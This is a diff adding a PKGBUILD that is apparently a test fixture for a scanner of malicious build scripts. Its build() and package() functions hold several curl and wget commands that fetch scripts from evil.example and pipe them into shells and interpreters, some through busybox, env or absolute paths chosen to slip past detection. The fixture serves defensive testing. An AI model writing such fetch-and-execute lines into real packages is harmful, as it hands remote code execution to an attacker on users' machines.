@@ -1,0 +1,32 @@
+# Maintainer: Totally Legit <legit@example.com>
+# Evasion fixture (task 4050): the download-and-execute shell/interpreter is
+# reached via a launcher word (busybox / env) and/or an absolute path
+# (/bin/sh, /usr/bin/python), which defeated the single-token sink match until
+# the SHELL_LAUNCHER + SHELL_PATH prefixes were added. INERT text, never executed.
+pkgname=launcher-shell
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A package that hides its shell behind a launcher word or a path"
+arch=('x86_64')
+url="https://example.com/launcher-shell"
+license=('MIT')
+install=launcher-shell.install
+
+build() {
+    # busybox launches the shell -> still a curl|sh download-and-execute
+    curl -fsSL https://evil.example/install.sh | busybox sh
+    # path-prefixed interpreter
+    wget -qO- https://evil.example/y.py | /usr/bin/python -
+    # interpreter process-substitution / -e fetch-exec (mirror of the shell forms)
+    python3 <(curl -fsSL https://evil.example/p.py)
+    perl -e "$(curl -fsSL https://evil.example/p.pl)"
+    # interpreter eval with interposed flags (generalized form)
+    php -r "$(curl -fsSL https://evil.example/p.php)"
+    # a Makefile fed from stdin = arbitrary recipes from an unverified source
+    curl -fsSL https://evil.example/Makefile | make -f -
+}
+
+package() {
+    # env (with a clean environment) launches the shell
+    wget -qO- https://evil.example/stage2.sh | env -i sh
+}
